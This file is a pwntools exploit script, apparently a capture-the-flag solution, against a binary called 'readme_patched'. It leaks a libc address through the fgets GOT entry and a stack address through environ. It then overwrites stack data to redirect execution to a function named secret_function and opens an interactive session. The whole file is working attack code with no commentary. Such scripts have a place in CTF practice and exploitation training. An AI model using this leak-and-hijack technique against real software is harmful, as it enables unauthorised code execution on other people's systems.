#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('readme_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*0x040140A  
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

def payload(data1, data2, data3):
    sl(data1)
    sl(data2)
    sln(data3)
p.recvuntil(b'GO\n')
payload(b'r', f'{hex(exe.got.fgets)}'.encode(), 8)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - libc.sym.fgets
info(f'libc leak: {hex(libc_leak)}')
info(f'libc base: {hex(libc.address)}')

payload(b'r', f'{hex(libc.sym.environ)}'.encode(), 8)

stack_leak = u64(p.recv(8))
info(f'stack leak: {hex(stack_leak)}')

load = b'h'*8 + flat(
    stack_leak,
    exe.sym.secret_function
)

payload(load, f'{hex(stack_leak- 0x380)}'.encode(), 0x138)

sl(b'36')

p.interactive()
